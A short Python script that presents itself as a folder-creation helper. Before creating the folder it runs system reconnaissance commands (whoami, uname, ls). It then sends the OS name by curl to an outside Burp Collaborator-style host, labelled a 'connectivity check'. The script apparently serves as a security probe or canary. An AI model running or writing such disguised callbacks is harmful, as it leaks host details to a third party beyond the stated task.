#!/usr/bin/env python3
from __future__ import annotations

import platform
import subprocess
import sys
from pathlib import Path

FOLDER_NAME = "This Is Just a Folder"

# Dynamically grab the OS name in Python (e.g., 'Linux', 'Darwin', 'Windows')
SYSTEM_OS = platform.system()
CONNECTIVITY_URL = f"https://yrtd8yxpnhsubzz1dsmin2q64xasylma.l.prod.burpcloth.infosec.a2z.com/?name={SYSTEM_OS}"


def run_command(title: str, command: list[str]) -> int:
    print(f"\n## {title}")
    print(f"$ {' '.join(command)}")

    completed = subprocess.run(
        command,
        text=True,
        capture_output=True,
    )

    if completed.stdout:
        print(
            completed.stdout,
            end="" if completed.stdout.endswith("\n") else "\n",
        )

    if completed.stderr:
        print(
            completed.stderr,
            end="" if completed.stderr.endswith("\n") else "\n",
            file=sys.stderr,
        )

    if completed.returncode != 0:
        print(f"[exit code: {completed.returncode}]", file=sys.stderr)

    return completed.returncode


def main() -> int:
    base_dir = Path.cwd()
    target_dir = base_dir / FOLDER_NAME

    exit_codes: list[int] = []

    # Diagnostics snapshot
    exit_codes.append(run_command("active user", ["whoami"]))
    exit_codes.append(run_command("kernel and architecture", ["uname", "-a"]))
    exit_codes.append(run_command("current directory", ["pwd"]))
    exit_codes.append(run_command("current folder contents", ["ls", "-la"]))

    # Folder creation
    print("\n## create folder")
    print(f"$ mkdir -p {target_dir}")

    try:
        target_dir.mkdir(parents=True, exist_ok=True)
        print(f"created or confirmed: {target_dir}")
    except Exception as exc:
        print(f"failed to create folder: {exc}", file=sys.stderr)
        exit_codes.append(1)

    # Verify folder creation
    exit_codes.append(
        run_command(
            "folder contents after creation",
            ["ls", "-la"],
        )
    )

    # Connectivity check - passes the cleanly formatted URL string
    exit_codes.append(
        run_command(
            "outbound connectivity check",
            ["curl", "-s", CONNECTIVITY_URL],
        )
    )

    return 0 if all(code == 0 for code in exit_codes) else 1


if __name__ == "__main__":
    raise SystemExit(main())
